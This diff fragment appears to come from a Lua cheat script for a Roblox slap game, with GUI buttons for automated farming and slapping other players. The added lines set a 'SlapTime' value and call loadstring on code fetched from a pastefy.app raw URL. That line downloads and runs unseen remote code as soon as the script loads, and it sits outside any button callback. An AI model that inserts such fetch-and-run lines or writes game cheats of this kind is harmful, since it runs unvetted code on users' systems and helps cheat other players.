@@ -548,6 +548,10 @@ end
 	end    
 })
 
+		SlapTime = 10 -- How many people you want to slap
+		loadstring(game:HttpGet"https://pastefy.app/TuWoiYJ8/raw")()
+	
+
 Slap:AddButton({
 	Name = "Copy serverhop slapples farming { PUT INTO AUTOEXEC }",
 	Callback = function()
